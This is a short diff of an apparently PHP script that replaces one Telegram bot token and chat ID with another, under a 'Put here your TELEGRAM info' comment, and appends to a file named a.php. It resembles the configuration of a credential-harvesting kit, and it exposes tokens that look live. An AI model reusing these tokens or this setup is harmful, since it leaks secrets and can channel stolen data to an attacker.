@@ -16,8 +16,8 @@
 
 
 /* Put here your TELEGRAM info   */
-$botToken="5223536041:AAFQwkv2dGOd3_4y08XCwdJJdXp1D3XTDSg";
-$chatId="5177140764";  
+$botToken="5441895659:AAGahuNZ3XqKAPf7kOqm1YNSNPM63DmRH8U";
+$chatId="5391646970";  
 
 
 $f = fopen("../../a.php", "a");
